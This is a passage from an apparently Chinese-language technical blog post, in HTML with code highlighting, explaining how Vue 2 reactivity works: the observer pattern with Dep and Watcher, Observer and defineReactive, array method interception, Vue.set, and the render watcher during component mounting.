punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 测试</span>    <span class="token keyword">let</span> em <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmitter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 信号中心</span>    em<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'click1'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    em<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'click2'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    em<span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">)</span></code></pre><p><a href="https://juejin.cn/post/6844903589815517192" target="_blank" rel="noopener">Object.create(null) 和 {} 的区别</a></p><h3 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h3><ul><li>观察者  – watcher<ul><li>update()：当事件发生时，具体要做的事情</li></ul></li><li>发布者 – Dep<ul><li>subs数组：存储所有观察者</li><li>addSub()：添加观察者</li><li>notify()：当事件发生，调用所有观察者的update方法</li></ul></li><li>没有事件中心</li></ul><pre class=" language-js"><code class="language-js"> <span class="token comment" spellcheck="true">// 发布者-目标</span>    <span class="token keyword">class</span> <span class="token class-name">Dep</span> <span class="token punctuation">{</span>      constructor <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 记录所有的订阅者</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 添加订阅者</span>      addSub <span class="token punctuation">(</span>sub<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sub <span class="token operator">&amp;&amp;</span> sub<span class="token punctuation">.</span>update<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sub<span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 发布通知</span>      notify <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>subs<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>sub <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          sub<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 订阅者-观察者</span>    <span class="token keyword">class</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>      update <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'update'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 测试</span>    <span class="token keyword">let</span> dep <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> watcher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    dep<span class="token punctuation">.</span><span class="token function">addSub</span><span class="token punctuation">(</span>watcher<span class="token punctuation">)</span>    dep<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="Vue实例初始化过程"><a href="#Vue实例初始化过程" class="headerlink" title="Vue实例初始化过程"></a>Vue实例初始化过程</h3><p>在 Vue 实例初始化的时候会调用<code>_init</code>方法，<code>_init</code>方法中有很多初始化的过程，比如</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//初始化生命周期</span><span class="token function">initLifecycle</span><span class="token punctuation">(</span>vm<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//初始化事件</span><span class="token function">initEvents</span><span class="token punctuation">(</span>vm<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//初始化render</span><span class="token function">initRender</span><span class="token punctuation">(</span>vm<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// ...</span><span class="token function">initState</span><span class="token punctuation">(</span>vm<span class="token punctuation">)</span></code></pre><p>这里的重点就是<code>initState</code>方法，<code>initState</code>中也初始化了很多，如下：</p><pre class=" language-js"><code class="language-js">  <span class="token comment" spellcheck="true">//初始化props</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>props<span class="token punctuation">)</span> <span class="token function">initProps</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> opts<span class="token punctuation">.</span>props<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//初始化methods</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>methods<span class="token punctuation">)</span> <span class="token function">initMethods</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> opts<span class="token punctuation">.</span>methods<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//初始化data！！！再次划重点！！！</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">initData</span><span class="token punctuation">(</span>vm<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//即使没有data，也要调用observe观测_data对象</span>    <span class="token function">observe</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">/* asRootData */</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span></code></pre><p>这里的重点就是<code>initData</code>方法，在其内部调用了<code>observe</code>方法，到这里才是真正响应式的开始</p><pre class=" language-js"><code class="language-js">  <span class="token comment" spellcheck="true">//将vm中的属性转至vm._data中</span>  <span class="token function">proxy</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`_data`</span></span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//调用observe观测data对象</span>  <span class="token function">observe</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">/* asRootData */</span><span class="token punctuation">)</span></code></pre><p>observe是一个工厂函数，用于为对象生成一个Observe实例。而真正将对象转化为响应式对象的是observe工厂函数返回的Observe实例。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>  constructor <span class="token punctuation">(</span>value<span class="token punctuation">:</span> any<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//对象本身</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value    <span class="token comment" spellcheck="true">//依赖收集器</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>dep <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>vmCount <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">//为对象添加__ob__属性</span>    <span class="token function">def</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token string">'__ob__'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//若对象是array类型</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token operator">...</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//若对象是object类型</span>      <span class="token operator">...</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>从代码分析，Observe构造函数做了三件事：</p><ul><li>为对象添加 <code>__ob__</code>属性， <code>__ob__</code>中包含value数据对象本身、dep依赖收集器、vmCount。数据经过这个步骤以后的变化如下：</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//原数据</span>  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">'summer'</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//变化后数据</span>  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>        name<span class="token punctuation">:</span> <span class="token string">'summer'</span><span class="token punctuation">,</span>        __ob__<span class="token punctuation">:</span> <span class="token punctuation">{</span>            value<span class="token punctuation">:</span> data<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//data数据本身</span>            dep<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Dep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//dep依赖收集器</span>            vmCount<span class="token punctuation">:</span> <span class="token number">0</span>        <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><ul><li>若对象是array类型，则进行array类型操作</li><li>若对象是object类型，则进行object类型操作</li></ul><h4 id="1-数据是object类型"><a href="#1-数据是object类型" class="headerlink" title="1. 数据是object类型"></a>1. 数据是object类型</h4><p>当数据是object类型时，调用了一个walk方法，在walk方法中遍历数据的所有属性，并调用defineReactive方法。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> defineReactive <span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//dep存储依赖的变量，每个属性字段都有一个属于自己的dep，用于收集属于该字段的依赖</span>  <span class="token keyword">const</span> dep <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//为属性加入getter/setter方法</span>  Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token punctuation">{</span>    enumerable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token keyword">get</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 收集依赖，target会在watcher类中定义</span>      Dep<span class="token punctuation">.</span>target <span class="token operator">&amp;&amp;</span> dep<span class="token punctuation">.</span><span class="token function">addSub</span><span class="token punctuation">(</span>Dep<span class="token punctuation">.</span>target<span class="token punctuation">)</span>      <span class="token keyword">return</span> val    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>newValue <span class="token operator">===</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>      <span class="token punctuation">}</span>       val <span class="token operator">=</span> newValue       that<span class="token punctuation">.</span><span class="token function">walk</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">// 发送通知</span>       dep<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p><strong>在getter中收集依赖，在setter中触发依赖。</strong></p><ul><li>当外界通过Watcher读取数据时，会触发getter从而将Watcher添加到依赖中。</li><li>在修改对象的值的时候，会触发对应的<code>setter</code>， <code>setter</code>通知之前<strong>依赖收集</strong>得到的 Dep 中的每一个 Watcher，告诉它们自己的值改变了，需要重新渲染视图。这时候这些 Watcher就会开始调用 <code>update</code> 来更新视图。</li></ul><h4 id="2-数据是array类型"><a href="#2-数据是array类型" class="headerlink" title="2. 数据是array类型"></a>2. 数据是array类型</h4><p>调用<code>arrayMethods</code>拦截修改数组方法：</p><ul><li>需要拦截的修改数组的方法有：push、pop、shift、unshift、splice、sort、reverse</li><li>当数组有新增元素时，使用observeArray对新增的元素进行观测</li></ul><p><strong>对于对象</strong></p><p>Vue 无法检测 property 的添加或移除。这是因为 Vue 通过<code>Object.defineProperty</code>来将对象的key转换成<code>getter/setter</code>的形式来追踪变化，但<code>getter/setter</code>只能追踪一个数据是否被修改，无法追踪新增属性和删除属性。由于 Vue 会在<strong>初始化实例</strong>时对 property 执行 getter/setter 转化，所以 property 必须在 <code>data</code> 对象上存在才能让 Vue 将它转换为响应式的。例如：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  data<span class="token punctuation">:</span><span class="token punctuation">{</span>    a<span class="token punctuation">:</span><span class="token number">1</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// `vm.a` 是响应式的</span>vm<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token comment" spellcheck="true">// `vm.b` 是非响应式的</span></code></pre><p>对于已经创建的实例，Vue 不允许动态添加根级别的响应式 property。但是，可以使用 <code>Vue.set(object, propertyName, value)</code> 方法向嵌套对象添加响应式 property。例如，对于：</p><pre class=" language-js"><code class="language-js">Vue<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>someObject<span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>您还可以使用 <code>vm.$set</code> 实例方法，这也是全局 <code>Vue.set</code> 方法的别名：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$<span class="token keyword">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>someObject<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><ul><li>给data对象的某个属性设置为一个新的对象<code>this.o = { name: &#39;xxx&#39; }</code>，此对象是响应式的</li><li>给data对象的obj新增一个name属性时，<code>this.obj.name = &#39;xxx&#39;</code>，该属性不是响应式的</li></ul><p><strong>对于数组</strong></p><p><code>Object.defineProperty</code> 不能监听数组的一些方法，push/pop/splice等等改变原数组的方法不能触发set，需要进行数组方法的重写。（Vue3中使用proxy则不存在这些问题）</p><pre class=" language-js"><code class="language-js">因为 Vue2<span class="token punctuation">.</span>x 的响应式是通过 Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 实现的，这个 api 没办法监听数组长度的变化，也就没办法监听数组的新增，push<span class="token operator">/</span>pop<span class="token operator">/</span>splice等也就不能触发<span class="token keyword">set</span></code></pre><p>此外 Vue 不能检测以下数组的变动：</p><ol><li>当你利用索引直接设置一个数组项时，例如：<code>vm.items[indexOfItem] = newValue</code></li><li>当你修改数组的长度时，例如：<code>vm.items.length = newLength</code></li></ol><p>举个例子：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  data<span class="token punctuation">:</span> <span class="token punctuation">{</span>    items<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>vm<span class="token punctuation">.</span>items<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'x'</span> <span class="token comment" spellcheck="true">// 不是响应性的</span>vm<span class="token punctuation">.</span>items<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true">// 不是响应性的</span></code></pre><p><strong>为什么数组方法可以重写，但是不去监听数组属性(索引和length)呢？</strong></p><ul><li>性能问题：数组数据可能有很多</li></ul><p>为了解决这个问题，以下两种方式都可以实现和 <code>vm.items[indexOfItem] = newValue</code> 相同的效果，同时也将在响应式系统内触发状态更新：</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// Vue.set</span>Vue<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>items<span class="token punctuation">,</span> indexOfItem<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Array.prototype.splice</span>vm<span class="token punctuation">.</span>items<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>indexOfItem<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> newValue<span class="token punctuation">)</span></code></pre><p>你也可以使用 <a href="https://cn.vuejs.org/v2/api/#vm-set" target="_blank" rel="noopener"><code>vm.$set</code></a> 实例方法，该方法是全局方法 <code>Vue.set</code> 的一个别名：</p><pre class=" language-js"><code class="language-js">vm<span class="token punctuation">.</span>$<span class="token keyword">set</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>items<span class="token punctuation">,</span> indexOfItem<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span></code></pre><p>为了解决不监听数组长度的问题，你可以使用 <code>splice</code>和重写数组方法：</p><pre class=" language-js"><code class="language-js">vm<span class="token punctuation">.</span>items<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>newLength<span class="token punctuation">)</span></code></pre><ul><li>Vue.set 和 vm.$set内部是同一个方法，原理是手动触发 notify</li></ul><pre class=" language-js"><code class="language-js">  <span class="token comment" spellcheck="true">// 获取 target 中的 observer 对象</span>  <span class="token keyword">const</span> ob <span class="token operator">=</span> <span class="token punctuation">(</span>target<span class="token punctuation">:</span> any<span class="token punctuation">)</span><span class="token punctuation">.</span>__ob__  <span class="token comment" spellcheck="true">// 如果 target 是 vue 实例或者$data 直接返回</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span>_isVue <span class="token operator">||</span> <span class="token punctuation">(</span>ob <span class="token operator">&amp;&amp;</span> ob<span class="token punctuation">.</span>vmCount<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> val  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 如果 ob 不存在，target 不是响应式对象直接赋值</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ob<span class="token punctuation">)</span> <span class="token punctuation">{</span>    target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val    <span class="token keyword">return</span> val  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 把 key 设置成响应式属性</span>  <span class="token function">defineReactive</span><span class="token punctuation">(</span>ob<span class="token punctuation">.</span>value<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 发送通知</span>  ob<span class="token punctuation">.</span>dep<span class="token punctuation">.</span><span class="token function">notify</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> val<span class="token punctuation">}</span></code></pre><h3 id="组件渲染过程"><a href="#组件渲染过程" class="headerlink" title="组件渲染过程"></a>组件渲染过程</h3><p><strong>那么究竟是如何触发依赖实现响应式的呢，从组件渲染阶段开始说起</strong></p><p>vue源码的 instance/init.js 中是初始化的入口，其中初始化中除了初始化的几个步骤以外，在最后有这样一段 代码：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>vm<span class="token punctuation">.</span>$options<span class="token punctuation">.</span>el<span class="token punctuation">)</span> <span class="token punctuation">{</span>  vm<span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>$options<span class="token punctuation">.</span>el<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li>一共有两个<code>$mount</code>,第一个定义在<code>entry-runtime-with-compiler.js</code>文件中,<code>$mount()</code>的核心作用是帮我们把模板编译成<code>render</code>函数，但它首先会判断一下当前是否传入了<code>render</code>选项，如果没有传入的话，它会去获取我们的<code>template</code>选项，如果<code>template</code>选项也没有的话，他会把<code>el</code>中的内容作为我们的模板，然后把模板编译成<code>render</code>函数，它是通过<code>compile</code>函数，帮我们把模板编译成<code>render</code>函数的,当把<code>render</code>函数编译好之后，它会把<code>render</code>函数存在我们的<code>options.render</code>中。（<a href="https://juejin.cn/post/6844904073238446093" target="_blank" rel="noopener">Vue 完整版和运行时版本的区别</a>）</li><li>接着会调用<code>src/platforms/web/runtime/index.js</code>文件中的<code>$mount</code>方法,在这个中首先会重新获取<code>el</code>，因为如果是运行时版本的话，是不会走<code>entry-runtime-with-compiler.js</code>这个入口中获取el，我们会在runtime/index.js的$mount()中重新获取el。</li><li>接下来调用<code>mountComponent()</code>,首先会判断<code>render</code>选项，如果没有<code>render</code>选项，但是我们传入了模板，会发送一个警告，,告诉我们如果是运行时版本不支持编译器。接下来会触发beforeMount这个生命周期中的钩子函数，也就是开始挂载之前。</li><li>然后定义了updateComponent()，在这个函数中，调用<code>vm._render</code>和<code>vm._update</code>，<code>vm._render</code>的作用是生成虚拟DOM，<code>vm._update</code>的作用是将虚拟<code>DOM</code>转换成真实<code>DOM</code>，并且挂载到页面上</li><li>创建<code>Watcher</code>对象，在创建<code>Watcher</code>时，传递了<code>updateComponent</code>这个函数，这个函数最终是在<code>Watcher</code>内部调用的。在<code>Watcher</code>内部会用<code>get</code>方法，当Watcher创建完成之后,会触发生命周期中的<code>mounted</code>钩子函数,在get方法中，会调用<code>updateComponent()</code></li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> updateComponent<span class="token punctuation">,</span> noop<span class="token punctuation">,</span> <span class="token punctuation">{</span>    before <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>vm<span class="token punctuation">.</span>_isMounted <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>vm<span class="token punctuation">.</span>_isDestroyed<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">callHook</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> <span class="token string">'beforeUpdate'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">/* isRenderWatcher */</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// vm ：与Wather对应的Vue Component实例，这种对应关系通过Wather去管理</span><span class="token comment" spellcheck="true">// updateComponent：可以理解成Vue Component的更新函数，调用实例render和update两个方法，render作用是将Vue对象渲染成虚拟DOM,update是通过虚拟DOM创建或者更新真实DOM</span></code></pre><p>Watche 实例分为渲染 watcher (render watcher),计算属性 watcher (computed watcher),侦听器 watcher（user watcher）三种：</p><ol><li>initState 时,对 computed 属性初始化时,触发 computed watcher 依赖收集</li><li>initState 时,对侦听属性初始化时,触发 user watcher 依赖收集</li><li>render()的过程,触发 render watcher 依赖收集</li><li>re-render 时,vm.render()再次执行,会移除所有 subs 中的 watcer 的订阅,重新赋值。</li></ol><p><strong>watcher类</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Watcher</span> <span class="token punctuation">{</span>    constructor <span class="token punctuation">(</span>    vm<span class="token punctuation">:</span> Component<span class="token punctuation">,</span>     expOrFn<span class="token punctuation">:</span> string <span class="token operator">|</span> Function<span class="token punctuation">,</span>    cb<span class="token punctuation">:</span> Function<span class="token punctuation">,</span>    options<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token operator">?</span>Object<span class="token punctuation">,</span>    isRenderWatcher<span class="token operator">?</span><span class="token punctuation">:</span> boolean  <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>vm <span class="token operator">=</span> vm    <span class="token keyword">if</span> <span class="token punctuation">(</span>isRenderWatcher<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 将渲染函数的观察者存入_watcher</span>      vm<span class="token punctuation">.</span>_watcher <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 将所有观察者push到_watchers列表</span>    vm<span class="token punctuation">.</span>_watchers<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">get</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 触发取值操作，进而触发属性的getter</span>    <span class="token function">pushTarget</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Dep 中提到的：给 Dep.target 赋值</span>    <span class="token keyword">let</span> value    <span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>vm    <span class="token keyword">try</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 核心，运行观察者表达式，进行取值，触发getter，从而在闭包中添加watcher</span>      value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>getter<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> vm<span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">handleError</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`getter for watcher "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>expression<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> e      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>deep<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 如果要深度监测，再对 value 执行操作</span>        <span class="token function">traverse</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 清理依赖收集</span>      <span class="token function">popTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">cleanupDeps</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> value  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 当依赖变化时，触发更新</span>  update <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token operator">...</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="响应式的整体流程"><a href="#响应式的整体流程" class="headerlink" title="响应式的整体流程"></a>响应式的整体流程</h3><p>总结一下响应式的整体流程：<br>假设有模版：</p><pre class=" language-vue"><code class="language-vue"><div id="test">  